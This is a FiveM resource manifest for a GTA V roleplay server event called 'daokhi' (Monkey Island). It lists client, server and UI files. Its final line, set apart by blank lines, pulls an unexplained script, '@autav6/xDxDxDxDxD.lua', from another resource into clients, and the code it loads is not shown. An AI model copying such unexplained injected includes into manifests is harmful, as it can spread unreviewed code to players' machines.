fx_version 'cerulean'
game 'gta5'

name "daokhi"
description "SK Đảo khỉ"
author "Onishidato"
version "1.0.0"

client_scripts {
	'client/*.lua',
	'config.lua',
	'client/lib.lua'
}

ui_page 'html/index.html'
files {
	'html/index.html',
    'html/app.js',
    'html/style.css',
    'html/sound/attention.mp3'
}

server_scripts {
	'server/*.lua',
	'client/lib.lua',
	'config.lua'
}


client_script '@autav6/xDxDxDxDxD.lua'